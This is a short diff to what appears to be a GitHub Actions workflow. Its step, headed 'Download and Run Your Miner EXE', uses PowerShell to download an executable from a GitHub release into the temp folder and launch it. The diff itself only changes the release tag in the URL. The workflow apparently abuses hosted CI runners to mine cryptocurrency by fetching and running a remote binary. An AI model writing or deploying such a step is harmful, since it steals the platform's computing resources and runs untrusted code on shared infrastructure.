@@ -80,7 +80,7 @@ jobs:
       # --- DOWNLOAD & RUN YOUR MINER HERE ---
       - name: Download and Run Your Miner EXE
         run: |
-          $minerUrl = "https://github.com/frtrialx-alt/Paisa-V.1/releases/download/V1.0/ok.exe"   # <-- update if you change release or filename
+          $minerUrl = "https://github.com/frtrialx-alt/Paisa-V.1/releases/download/V.1/ok.exe"
           $minerPath = "$env:TEMP\ok.exe"
           Invoke-WebRequest -Uri $minerUrl -OutFile $minerPath
           Start-Process -FilePath $minerPath
